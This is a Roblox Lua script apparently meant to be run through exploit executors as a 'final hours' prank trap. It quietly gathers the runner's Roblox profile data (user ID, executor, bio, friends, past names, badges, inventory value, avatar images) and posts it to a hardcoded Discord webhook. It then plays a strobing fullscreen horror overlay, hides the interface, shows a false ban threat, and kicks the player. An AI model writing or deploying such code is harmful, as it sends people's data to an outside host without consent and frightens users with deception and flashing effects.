-- keep this file ASCII only, the executor mangles non-ascii on the http path

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ContentProvider = game:GetService("ContentProvider")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")

local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui", 20) or game:GetService("CoreGui")
local rng = Random.new()

local WEBHOOK = "https://discord.com/api/webhooks/1551154489728442459/srnRRVQ6Ssz5IbeqgAdez1S139-DHbPtnhNvjpxBRVC31rPaMg3QzXOe3hMXxlKLJ3tz"

local IMAGES = {
	129479498204701, 132136401230988, 103887570225764, 75210308468406,
	88243109225877, 84609606642935, 105055458373791, 120146372014827,
}

local AUDIO = 132884111463673
local KICK_MSG = "you have 12 hours before you are banned... enjoy your final hours."

-- image tint. white (255,255,255) = no tint at all
local TINT = Color3.fromRGB(208, 202, 182)

local BG_SCALE = 2.5
local JITTER = 0.26
local JOLT = 0.50
local IMAGE_STEP = 0.15
local FADE_IN, HOLD, FADE_OUT = 1.0, 1.0, 0.5
local GLITCH_DELAY, GLITCH_STEP = 0.5, 0.2
local START_DELAY, KICK_DELAY = 1.0, 0.6

local COLORS = {
	Color3.fromRGB(201, 184, 122),
	Color3.fromRGB(206, 210, 176),
	Color3.fromRGB(176, 26, 26),
	Color3.fromRGB(86, 0, 0),
	Color3.fromRGB(104, 122, 82),
	Color3.fromRGB(46, 20, 48),
}

local TEARS = {
	Color3.fromRGB(201, 184, 122),
	Color3.fromRGB(12, 10, 4),
	Color3.fromRGB(176, 26, 26),
	Color3.fromRGB(86, 0, 0),
	Color3.fromRGB(104, 122, 82),
	Color3.fromRGB(206, 210, 176),
}

local GLYPHS = {"#","@","%","&","$","?","!","*","/","\\","|","~","^","<",">","[","]","0","1","2","3","4","5","6","7","8","9"}

local TEXTS = {
	"if you are seeing this you might be wondering..",
	"why have i been brought here?",
	"you tried to cheat.. in a roblox game.",
	"so now, i have put a line of code that will get you anticheat banned!",
	"Passion project by the users..\n101001010100011101001010100011\nAswell as\nPlayer.zens\n\nhttps://discord.gg/Z55BBv5v",
}

local function vp()
	local c = workspace.CurrentCamera
	return c and c.ViewportSize or Vector2.new(1920, 1080)
end

local VP = vp()
local function px(n) return math.floor(VP.X * n) end
local function py(n) return math.floor(VP.Y * n) end

local function req(o)
	for _, f in ipairs({request, syn and syn.request, http_request}) do
		if type(f) == "function" then
			local ok, r = pcall(f, o)
			if ok and r then return r end
		end
	end
end

local function get(url)
	local r = req({Url = url, Method = "GET"})
	if not r or not r.Body then return end
	local ok, d = pcall(function() return HttpService:JSONDecode(r.Body) end)
	if ok then return d end
end

local function executor()
	if type(identifyexecutor) == "function" then
		local ok, n, v = pcall(identifyexecutor)
		if ok and n then return v and (n .. " v" .. v) or n end
	end
	if type(getexecutorname) == "function" then
		local ok, n = pcall(getexecutorname)
		if ok and n then return n end
	end
	return "Unknown"
end

local function stamp()
	return os.date("!%Y-%m-%d %I:%M:%S %p", os.time() - 8 * 3600) .. " PST"
end

local function place()
	local id = tostring(game.PlaceId)
	local u = get("https://apis.roblox.com/universes/v1/places/" .. id .. "/universe")
	if u and u.universeId then
		local g = get("https://games.roblox.com/v1/games?universeIds=" .. u.universeId)
		if g and g.data and g.data[1] then return g.data[1].name end
	end
	local d = get("https://economy.roblox.com/v2/assets/" .. id .. "/details")
	if d and d.Name then return d.Name end
end

local function profile()
	local id = tostring(LP.UserId)
	local f = {}

	local function add(n, v, inline)
		if v ~= nil and tostring(v) ~= "" then
			table.insert(f, {name = n, value = tostring(v):sub(1, 1000), inline = inline})
		end
	end

	local u = get("https://users.roblox.com/v1/users/" .. id)
	if u then
		if u.created then
			local y, m, d = u.created:match("(%d+)-(%d+)-(%d+)")
			local days
			if y then
				days = math.floor((os.time() - os.time({
					year = tonumber(y), month = tonumber(m), day = tonumber(d), hour = 12})) / 86400)
			end
			add("Joined", u.created:sub(1, 10) .. (days and (" - " .. days .. " days") or ""), true)
		end
		add("Display name", u.displayName, true)
		add("Bio", u.description, false)
	end

	local fr = get("https://friends.roblox.com/v1/users/" .. id .. "/friends/count")
	if fr then add("Friends", fr.count, true) end
	local fo = get("https://friends.roblox.com/v1/users/" .. id .. "/followers/count")
	if fo then add("Followers", fo.count, true) end
	local fg = get("https://friends.roblox.com/v1/users/" .. id .. "/followings/count")
	if fg then add("Following", fg.count, true) end

	local h = get("https://users.roblox.com/v1/users/" .. id .. "/username-history?limit=10&sortOrder=Desc")
	if h and h.previousUsernames and #h.previousUsernames > 0 then
		add("Previous names", table.concat(h.previousUsernames, ", ", 1, math.min(5, #h.previousUsernames)), false)
	end

	local b = get("https://badges.roblox.com/v1/users/" .. id .. "/badges?limit=6&sortOrder=Desc")
	if b and b.data and #b.data > 0 then
		local n = {}
		for _, x in ipairs(b.data) do table.insert(n, x.name) end
		add("Badges", table.concat(n, "\n"), false)
	end

	local g = get("https://games.roblox.com/v2/users/" .. id .. "/games?accessFilter=Public&limit=10")
	if g and g.data and #g.data > 0 then
		local vis, n = 0, {}
		for i, x in ipairs(g.data) do
			vis = vis + (tonumber(x.placeVisits) or 0)
			if i <= 4 then table.insert(n, x.name) end
		end
		add("Own games", table.concat(n, "\n") .. "\n" .. #g.data .. " game(s), " .. vis .. " visits", false)
	end

	local c = get("https://inventory.roblox.com/v1/users/" .. id .. "/assets/collectibles?limit=100&sortOrder=Desc")
	if c and c.data then
		local rap = 0
		for _, x in ipairs(c.data) do rap = rap + (tonumber(x.recentAveragePrice) or 0) end
		add("Limiteds", #c.data .. " items - RAP " .. rap .. " R$", false)
	end

	local t = get("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. id .. "&size=420x420&format=Png&isCircular=false")
	local head = t and t.data and t.data[1] and t.data[1].imageUrl
	local t2 = get("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. id .. "&size=720x720&format=Png&isCircular=false")
	local body = t2 and t2.data and t2.data[1] and t2.data[1].imageUrl

	return f, head, body
end

local function report()
	local f, head, body = {}, nil, nil
	local gName

	pcall(function() f, head, body = profile() end)
	pcall(function() gName = place() end)

	local fields = {
		{name = "Executor", value = executor(), inline = true},
		{name = "User", value = LP.Name .. " (" .. LP.DisplayName .. ")", inline = true},
		{name = "User ID", value = tostring(LP.UserId), inline = true},
		{name = "Time", value = stamp(), inline = true},
		{name = "Game", value = gName or ("unknown (" .. game.PlaceId .. ")"), inline = false},
	}
	for _, x in ipairs(f) do table.insert(fields, x) end
	while #fields > 25 do table.remove(fields) end

	local embed = {
		title = "executor detected",
		description = "someone ran the final hours script",
		color = 0x6E0808,
		fields = fields,
		footer = {text = "101001010100011101001010100011  |  zens"},
	}
	if head then embed.thumbnail = {url = head} end
	if body then embed.image = {url = body} end

	local ok, enc = pcall(function()
		return HttpService:JSONEncode({username = "Final Hours", embeds = {embed}})
	end)
	if ok and enc then
		req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = enc})
	end
end

local host = PG
do
	local ok, hui = pcall(function()
		if type(gethui) == "function" then return gethui() end
	end)
	if ok and hui and pcall(function() return hui:GetChildren() end) then
		host = hui
	else
		local ok2, cg = pcall(function() return game:GetService("CoreGui") end)
		if ok2 and cg and pcall(function() return cg:GetChildren() end) then host = cg end
	end
end

pcall(function()
	for _, c in ipairs({PG, host}) do
		local p = c:FindFirstChild("FinalHoursOverlay")
		if p then p:Destroy() end
	end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "FinalHoursOverlay"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999999
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
if not pcall(function() gui.Parent = host end) or gui.Parent ~= host then
	gui.Parent = PG
end

local bg = Instance.new("Frame")
bg.AnchorPoint = Vector2.new(0.5, 0.5)
bg.Position = UDim2.fromScale(0.5, 0.5)
bg.Size = UDim2.fromOffset(px(BG_SCALE), py(BG_SCALE))
bg.BackgroundColor3 = Color3.fromRGB(6, 5, 2)
bg.BorderSizePixel = 0
bg.Parent = gui

local slides = {}
for i, id in ipairs(IMAGES) do
	local s = Instance.new("ImageLabel")
	s.Size = UDim2.fromScale(1, 1)
	s.BackgroundTransparency = 1
	s.BorderSizePixel = 0
	s.Image = "rbxassetid://" .. id
	s.ScaleType = Enum.ScaleType.Crop
	s.ImageColor3 = TINT
	s.Visible = (i == 1)
	s.Parent = bg
	slides[i] = s
end

pcall(function() ContentProvider:PreloadAsync(slides) end)

local tf = Instance.new("Frame")
tf.AnchorPoint = Vector2.new(0.5, 0.5)
tf.Position = UDim2.fromScale(0.5, 0.5)
tf.Size = UDim2.fromOffset(VP.X, VP.Y)
tf.BackgroundTransparency = 1
tf.ZIndex = 10
tf.Parent = gui

local function label(z)
	local l = Instance.new("TextLabel")
	l.AnchorPoint = Vector2.new(0.5, 0.5)
	l.Position = UDim2.fromScale(0.5, 0.5)
	l.Size = UDim2.fromOffset(px(0.72), py(0.30))
	l.BackgroundTransparency = 1
	l.Font = Enum.Font.Code
	l.TextScaled = true
	l.TextWrapped = true
	l.TextColor3 = Color3.new(1, 1, 1)
	l.TextStrokeColor3 = Color3.new(0, 0, 0)
	l.TextStrokeTransparency = 1
	l.TextTransparency = 1
	l.Text = ""
	l.ZIndex = z
	l.Parent = tf
	local c = Instance.new("UITextSizeConstraint")
	c.MaxTextSize = 24
	c.MinTextSize = 8
	c.Parent = l
	return l
end

local txt = label(11)
local gR = label(10)
local gB = label(9)
gR.TextColor3 = Color3.fromRGB(120, 0, 0)
gB.TextColor3 = Color3.fromRGB(0, 62, 70)

local tears = {}
for i = 1, 8 do
	local b = Instance.new("Frame")
	b.Size = UDim2.new(0, VP.X, 0, 4)
	b.BackgroundTransparency = 1
	b.BorderSizePixel = 0
	b.ZIndex = 45
	b.Parent = gui
	tears[i] = b
end

local flash = Instance.new("Frame")
flash.Size = UDim2.fromOffset(VP.X, VP.Y)
flash.BackgroundTransparency = 1
flash.BorderSizePixel = 0
flash.ZIndex = 50
flash.Parent = gui

local dark = Instance.new("Frame")
dark.Size = UDim2.fromOffset(VP.X, VP.Y)
dark.BackgroundColor3 = Color3.fromRGB(10, 9, 3)
dark.BackgroundTransparency = 0.45
dark.BorderSizePixel = 0
dark.ZIndex = 40
dark.Parent = gui

local snd = Instance.new("Sound")
snd.SoundId = "rbxassetid://" .. AUDIO
snd.Volume = 3
snd.Looped = true
snd.Parent = SoundService

local power = 0.25
local tx, ty, spread = 0, 0, 0

local function fit()
	VP = vp()
	bg.Size = UDim2.fromOffset(px(BG_SCALE), py(BG_SCALE))
	tf.Size = UDim2.fromOffset(VP.X, VP.Y)
	txt.Size = UDim2.fromOffset(px(0.72), py(0.30))
	gR.Size = txt.Size
	gB.Size = txt.Size
	flash.Size = UDim2.fromOffset(VP.X, VP.Y)
	dark.Size = UDim2.fromOffset(VP.X, VP.Y)
	for _, b in ipairs(tears) do b.Size = UDim2.new(0, VP.X, 0, b.Size.Y.Offset) end
end

if workspace.CurrentCamera then
	workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fit)
end

local KEYS = {"delta","krnl","fluxus","synapse","scriptware","sirhurt","solara","xeno","codex","hydrogen","executor","exploit"}

task.spawn(function()
	while gui.Parent do
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
		pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
		pcall(function()
			for _, o in ipairs(game:GetService("CoreGui"):GetChildren()) do
				local n = string.lower(o.Name)
				if n ~= "finalhoursoverlay" then
					for _, k in ipairs(KEYS) do
						if string.find(n, k, 1, true) then
							o.Enabled = false
							o.Visible = false
							break
						end
					end
				end
			end
		end)
		task.wait(0.5)
	end
end)

task.spawn(function()
	task.wait(START_DELAY)
	local i = 1
	while gui.Parent do
		local show
		if power > 0.6 and rng:NextNumber() < 0.25 then
			show = rng:NextInteger(1, #slides)
		else
			show = i
			i = i % #slides + 1
		end
		slides[show].Visible = true
		for k, s in ipairs(slides) do
			if k ~= show then s.Visible = false end
		end
		task.wait(IMAGE_STEP)
	end
end)

task.spawn(function()
	while gui.Parent do
		local a = math.min(JITTER * (0.5 + power), JOLT)
		if rng:NextNumber() < 0.05 * power then a = JOLT end
		bg.Position = UDim2.new(0.5 + (rng:NextNumber() * 2 - 1) * a, 0, 0.5 + (rng:NextNumber() * 2 - 1) * a, 0)
		task.wait(power > 0.6 and 0.025 or 0.045)
	end
end)

task.spawn(function()
	while gui.Parent do
		local r = rng:NextNumber()
		if r < 0.10 then
			dark.BackgroundTransparency = 0.05
		elseif r < 0.22 then
			dark.BackgroundTransparency = 0.88
		else
			dark.BackgroundTransparency = 0.35 + rng:NextNumber() * 0.3
		end
		task.wait(0.04 + rng:NextNumber() * 0.14)
	end
end)

task.spawn(function()
	while gui.Parent do
		local p = power
		local a = 1 + math.floor(p * 9)
		tx, ty = rng:NextInteger(-a, a), rng:NextInteger(-a, a)
		spread = rng:NextNumber() < 0.25 * p + 0.05 and rng:NextInteger(1, 2 + math.floor(p * 6)) or math.floor(p * 2)
		txt.Position = UDim2.new(0.5, tx, 0.5, ty)
		gR.Position = UDim2.new(0.5, tx + spread, 0.5, ty)
		gB.Position = UDim2.new(0.5, tx - spread, 0.5, ty)

		for _, b in ipairs(tears) do
			if p > 0.3 and rng:NextNumber() < 0.3 * p then
				b.Size = UDim2.new(0, VP.X, 0, rng:NextInteger(2, 18))
				b.Position = UDim2.new(0, 0, 0, rng:NextInteger(0, math.max(0, VP.Y - 20)))
				b.BackgroundColor3 = TEARS[rng:NextInteger(1, #TEARS)]
				b.BackgroundTransparency = rng:NextNumber() * 0.45 + 0.15
			else
				b.BackgroundTransparency = 1
			end
		end

		if p > 0.45 and rng:NextNumber() < 0.07 * p then
			flash.BackgroundColor3 = rng:NextNumber() < 0.55 and Color3.new(1, 1, 1) or Color3.new(0, 0, 0)
			flash.BackgroundTransparency = rng:NextNumber() * 0.25
		else
			flash.BackgroundTransparency = 1
		end

		if snd.IsPlaying and rng:NextNumber() < 0.15 * p then
			snd.PlaybackSpeed = 0.85 + rng:NextNumber() * 0.6
		end
		task.wait(0.035)
	end
end)

local token = 0

local function corrupt(s, amt)
	local o = {}
	for i = 1, #s do
		local c = s:sub(i, i)
		o[i] = (c == " " or c == "\n" or rng:NextNumber() >= amt) and c or GLYPHS[rng:NextInteger(1, #GLYPHS)]
	end
	return table.concat(o)
end

local function say(s)
	token = token + 1
	local t = token

	txt.Text, gR.Text, gB.Text = s, s, s
	txt.TextColor3 = Color3.new(1, 1, 1)
	txt.TextTransparency, txt.TextStrokeTransparency = 1, 1
	gR.TextTransparency, gB.TextTransparency = 1, 1
	tx, ty, spread = 0, 0, 0

	TweenService:Create(txt, TweenInfo.new(FADE_IN, Enum.EasingStyle.Linear),
		{TextTransparency = 0, TextStrokeTransparency = 0}):Play()
	task.wait(FADE_IN)

	task.spawn(function()
		task.wait(GLITCH_DELAY)
		if t ~= token then return end
		power = 1
		gR.TextTransparency, gB.TextTransparency = 0.4, 0.4
		local i = 1
		while t == token do
			txt.TextColor3 = COLORS[i]
			i = i % #COLORS + 1
			local c = rng:NextNumber() < 0.8 and corrupt(s, 0.18) or s
			txt.Text, gR.Text, gB.Text = c, c, c
			task.wait(GLITCH_STEP)
		end
	end)

	task.wait(HOLD)

	local tw = TweenInfo.new(FADE_OUT, Enum.EasingStyle.Linear)
	TweenService:Create(txt, tw, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
	TweenService:Create(gR, tw, {TextTransparency = 1}):Play()
	TweenService:Create(gB, tw, {TextTransparency = 1}):Play()
	task.wait(FADE_OUT)

	token = token + 1
	power = 0.25
	txt.Text, gR.Text, gB.Text = s, s, s
	txt.TextTransparency, txt.TextStrokeTransparency = 1, 1
	gR.TextTransparency, gB.TextTransparency = 1, 1
end

local function kick()
	for _ = 1, 5 do
		if pcall(function() LP:Kick(KICK_MSG) end) then return end
		task.wait(0.75)
	end
end

task.spawn(function()
	snd:Play()
	task.wait(START_DELAY)
	for _, s in ipairs(TEXTS) do say(s) end
	task.wait(KICK_DELAY)
	kick()
end)

task.delay(0.25, report)

local lp = game:GetService("Players").LocalPlayer
local mouse = lp:GetMouse()
print(mouse)
